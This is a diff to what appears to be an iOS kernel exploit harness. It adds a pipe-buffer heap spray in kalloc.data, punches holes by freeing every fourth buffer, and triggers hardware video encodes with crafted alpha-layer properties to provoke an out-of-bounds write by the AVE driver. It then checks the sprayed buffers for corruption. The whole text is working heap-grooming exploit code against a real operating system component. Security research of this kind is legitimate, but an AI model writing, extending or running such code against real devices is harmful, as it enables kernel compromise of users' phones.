@@ -7734,8 +7734,129 @@ vps_cd_done:
         if (corrupted > 0)
             rlog("*** HEAP CORRUPTION DETECTED — AVE OOB wrote into IOSurface property data ***\n");
         else
-            rlog("No corruption detected in this run.\n");
-        rlog("(If no corruption: try more surfaces, different prop_size, or multiple runs)\n");
+            rlog("No corruption in CFData spray.\n");
+
+        /* Phase 5: Try pipe buffer spray as alternative co-location target.
+         * Pipe buffers are allocated in kalloc.data zones which may share
+         * with driver allocations on iOS 27.1. */
+        rlog("\n--- Phase 5: Pipe buffer spray (kalloc.data) ---\n");
+        int pipe_count = 256;
+        int pipe_fds[256][2];
+        int pipes_ok = 0;
+        uint8_t *pipe_sentinel = malloc(prop_size);
+        for (int i = 0; i < pipe_count; i++) {
+            if (pipe(pipe_fds[i]) == 0) {
+                uint32_t ppat = 0xBEEF0000 | (uint16_t)i;
+                for (int j = 0; j < prop_size / 4; j++)
+                    ((uint32_t*)pipe_sentinel)[j] = ppat;
+                /* Write to pipe — kernel allocates pipe buffer in kalloc */
+                ssize_t w = write(pipe_fds[i][1], pipe_sentinel, prop_size);
+                if (w == prop_size) pipes_ok++;
+                else {
+                    close(pipe_fds[i][0]); close(pipe_fds[i][1]);
+                    pipe_fds[i][0] = pipe_fds[i][1] = -1;
+                }
+            } else {
+                pipe_fds[i][0] = pipe_fds[i][1] = -1;
+            }
+        }
+        rlog("Pipes created with %dB data: %d / %d\n", prop_size, pipes_ok, pipe_count);
+
+        /* Create holes in pipe buffers */
+        int pipe_freed = 0;
+        for (int i = 2; i < pipe_count; i += 4) {
+            if (pipe_fds[i][0] >= 0) {
+                close(pipe_fds[i][0]); close(pipe_fds[i][1]);
+                pipe_fds[i][0] = pipe_fds[i][1] = -1;
+                pipe_freed++;
+            }
+        }
+        rlog("Freed %d pipe buffers (holes)\n", pipe_freed);
+
+        /* Trigger another round of AVE encodes */
+        rlog("Triggering %d more AVE encodes...\n", encode_count);
+        {
+            VTCompressionSessionRef ave2 = NULL;
+            CFMutableDictionaryRef es2 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es2, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus s2 = VTCompressionSessionCreate(NULL, 192, 192,
+                (CMVideoCodecType)0x6D757861, es2, NULL, NULL, encode_cb, NULL, &ave2);
+            CFRelease(es2);
+            if (s2 == noErr && ave2) {
+                VTSessionSetProperty(ave2, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                VTSessionSetProperty(ave2, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+                int aid2 = 128;
+                CFNumberRef aidn2 = CFNumberCreate(NULL, kCFNumberIntType, &aid2);
+                VTSessionSetProperty(ave2, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn2);
+                CFRelease(aidn2);
+                s2 = VTCompressionSessionPrepareToEncodeFrames(ave2);
+                rlog("Prepare: %d\n", (int)s2);
+                if (s2 == noErr) {
+                    for (int e = 0; e < encode_count; e++) {
+                        g_encode_done = 0;
+                        CVPixelBufferRef pb = NULL;
+                        CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                        if (pb) {
+                            CVPixelBufferLockBaseAddress(pb, 0);
+                            void *b = CVPixelBufferGetBaseAddress(pb);
+                            if (b) memset(b, (uint8_t)(e & 0xFF), CVPixelBufferGetDataSize(pb));
+                            CVPixelBufferUnlockBaseAddress(pb, 0);
+                            VTCompressionSessionEncodeFrame(ave2, pb, CMTimeMake(e, 30),
+                                kCMTimeInvalid, NULL, NULL, NULL);
+                            CVPixelBufferRelease(pb);
+                        }
+                    }
+                    VTCompressionSessionCompleteFrames(ave2, kCMTimePositiveInfinity);
+                    rlog("Encode + flush complete.\n");
+                }
+                VTCompressionSessionInvalidate(ave2);
+                CFRelease(ave2);
+            }
+        }
+
+        /* Read back pipe buffers and check for corruption */
+        rlog("Checking pipe buffers...\n");
+        int pipe_corrupted = 0, pipe_checked = 0;
+        for (int i = 0; i < pipe_count; i++) {
+            if (pipe_fds[i][0] < 0) continue;
+            pipe_checked++;
+            uint8_t *rbuf = malloc(prop_size);
+            ssize_t r = read(pipe_fds[i][0], rbuf, prop_size);
+            if (r != prop_size) {
+                rlog("  pipe[%d]: short read %zd\n", i, r);
+                pipe_corrupted++;
+            } else {
+                uint32_t ppat = 0xBEEF0000 | (uint16_t)i;
+                int pm = 0;
+                int first_off = -1;
+                uint32_t first_got = 0;
+                for (int j = 0; j < prop_size / 4; j++) {
+                    uint32_t got;
+                    memcpy(&got, rbuf + j * 4, 4);
+                    if (got != ppat) {
+                        if (pm == 0) { first_off = j * 4; first_got = got; }
+                        pm++;
+                    }
+                }
+                if (pm > 0) {
+                    pipe_corrupted++;
+                    rlog("  *** PIPE[%d] CORRUPTED: %d dwords bad, first at +%d: 0x%08x (expected 0x%08x) ***\n",
+                        i, pm, first_off, first_got, ppat);
+                }
+            }
+            free(rbuf);
+            close(pipe_fds[i][0]); close(pipe_fds[i][1]);
+        }
+        rlog("Pipe results: checked=%d corrupted=%d\n", pipe_checked, pipe_corrupted);
+        if (pipe_corrupted > 0)
+            rlog("*** PIPE CORRUPTION DETECTED — AVE OOB into pipe buffer ***\n");
+        else
+            rlog("No pipe corruption.\n");
+
+        free(pipe_sentinel);
+
+        rlog("\n(If no corruption: try different prop_size values: 8192, 10000, 12000, 14000)\n");
 
         for (int i = 0; i < spray_count; i++)
             if (surfs[i]) CFRelease((CFTypeRef)surfs[i]);
